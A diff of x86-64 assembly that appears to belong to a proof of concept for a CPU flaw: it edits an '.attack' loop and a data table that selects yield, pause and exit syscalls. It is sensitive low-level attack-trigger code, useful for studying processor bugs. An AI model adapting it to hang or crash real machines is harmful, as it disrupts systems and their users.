@@ -9,9 +9,6 @@ section .text
         mov rdi, rsi
         jmp .suffix
         .attack:
-        inc rax
-        xor ecx, ecx; clear ecx
-        .many_reptars:
         %rep 1
             align 0x1000
             ; 16 bytes
@@ -32,10 +29,11 @@ section .text
         %endrep
         .suffix:
         align 0x1000
-        times 0x1000*8 xlat
-        .exit:
+        times 0x1000*8 xlat ; mov al, ds:[ebx+al]
         mov dil, dl ; counter
         syscall
+        mov rax, 1  ; exit
+        xor ecx, ecx; clear ecx
         jmp .attack
 
 section .data
@@ -43,7 +41,10 @@ section .data
     data:
         db 24 ; first iteration (yield)
         db 60 ; second iteration (exit)
-        times 22 db 0
+        times 22 db 34
         db 24 ; data[24]=24
-        times 35 db 0
+        times 9 db 34
+        db 34 ; data[34]=34
+        times 25 db 34
         db 60 ; data[60]=60
+        times 0x1000-60 db 34 ; (pause)
